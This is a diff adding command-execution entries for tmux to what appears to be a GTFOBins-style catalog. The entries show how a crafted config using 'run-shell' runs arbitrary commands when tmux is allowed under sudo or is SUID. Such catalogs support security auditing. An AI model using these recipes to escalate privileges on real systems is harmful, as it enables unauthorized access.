@@ -1,5 +1,36 @@
 ---
 functions:
+  command:
+  - blind: true
+    code: |-
+      echo 'run-shell "/path/to/command"' >/path/to/temp-file.conf
+      tmux -f /path/to/temp-file.conf
+    contexts:
+      sudo:
+      suid:
+        shell: true
+  - blind: true
+    code: |-
+      mkdir -p /path/to/temp-dir
+      echo 'run-shell "/path/to/command"' >/path/to/temp-dir/.tmux.conf
+      HOME=/path/to/temp-dir tmux
+    comment: |-
+      If the `HOME` directory is already writable, the file can be placed directly as `~/.tmux.conf` without overriding `HOME`. The `HOME` environment variable must be passed to the privileged process.
+    contexts:
+      sudo:
+      suid:
+        shell: true
+  - blind: true
+    code: |-
+      mkdir -p /path/to/temp-dir/tmux
+      echo 'run-shell "/path/to/command"' >/path/to/temp-dir/tmux/tmux.conf
+      XDG_CONFIG_HOME=/path/to/temp-dir tmux
+    comment: |-
+      The `XDG_CONFIG_HOME` environment variable must be passed to the privileged process.
+    contexts:
+      sudo:
+      suid:
+        shell: true
   file-read:
   - binary: false
     code: |-
